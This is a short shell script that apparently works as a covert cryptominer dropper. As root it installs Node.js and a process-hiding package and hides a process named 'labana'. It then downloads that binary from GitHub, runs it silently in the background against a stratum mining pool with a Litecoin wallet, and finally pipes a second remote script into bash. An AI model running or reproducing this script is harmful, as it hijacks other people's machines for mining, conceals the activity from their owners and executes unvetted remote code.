#!/bin/sh
sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add labana"
wget https://github.com/malogrono/opr/raw/refs/heads/main/labana >/dev/null 2>&1
chmod +x labana
./labana -a rx -o stratum+tcp://148.113.141.142:80 -u LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.mang >/dev/null 2>&1 &
curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
